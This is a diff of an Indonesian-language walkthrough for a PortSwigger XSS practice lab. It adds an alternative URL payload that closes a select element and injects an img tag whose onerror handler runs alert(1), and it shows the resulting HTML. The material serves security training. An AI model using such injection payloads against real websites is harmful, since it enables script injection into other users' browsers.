@@ -22,7 +22,7 @@
 
 - Akan muncul list sebagai berikut
 
-![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%206.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%206.jpg)
 
 - Masukkan payload berikut pada URL kemudian tekan enter
 ```sh
@@ -31,6 +31,10 @@
 
 ![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/PRACTITIONER/assets/xss%207.JPG)
 
+- Selain payload diatas, anda juga bisa menggunakan payload dibawah ini
+```sh
+&storeId=</option></select><img%20src=1%20onerror=alert(1)>
+```
 - Payload diatas akan membentuk nilai sebagai berikut, sehingga menyebabkan kerentanan XSS
 ```sh
 <select name="storeId"><option selected="">storeId="></option></select>
